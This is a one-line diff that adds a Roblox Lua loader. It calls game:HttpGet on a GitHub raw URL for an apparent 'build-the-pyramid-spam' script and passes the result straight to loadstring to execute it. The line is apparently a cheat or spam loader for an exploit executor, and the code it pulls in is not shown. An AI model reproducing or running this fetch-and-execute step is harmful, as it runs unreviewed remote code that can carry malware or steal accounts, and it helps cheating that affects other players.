@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/build-the-pyramid-spam6-3rzekbbcl43tac.lua"))()
